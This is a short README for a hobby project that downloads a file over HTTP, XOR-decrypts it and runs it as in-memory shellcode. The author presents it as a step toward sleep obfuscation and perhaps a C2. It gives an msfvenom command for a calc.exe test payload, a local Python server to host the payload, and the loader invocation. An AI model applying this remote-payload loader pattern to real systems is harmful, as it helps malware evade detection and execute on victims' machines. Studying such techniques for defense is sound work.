# Shellcode Execution Project

## Overview

This project demonstrates how to download a file over HTTP using the WinHTTP library, encrypt/decrypt its contents using XOR single-byte key, and execute it as shellcode in memory. I mostly tried doing this out of curiosity. I'm just trying to get a sort of "building block" so I can attempt to create a Sleep Obfuscation technique and see how it works to then improve on it later for future projects... maybe a C2? 👀🤷 Who knows...

## Project Structure

- `src/main.c`: Main logic for the program.
- `src/encryptor.c`: Encryption and decryption functionality.
- `src/http_client.c`: Handles HTTP downloads.
- `include/encryptor.h`: Header file for the encryption logic.
- `Makefile`: Build system.

## Build and Run

### Build
```bash
make
```

### Steps to setup for analysis

Make sure you creat the shellcode first with `msfvenom` like so:
```bash
msfvenom -p windows/x64/exec cmd=calc.exe EXITFUNC=thread -f raw -o calc.bin
```

Then create the python web server to host the file: 
```python
python3 -m http.server
```

Then run the file with the right arguments:
```bash
./ultra-hider.exe localhost 8000 calc.bin
```
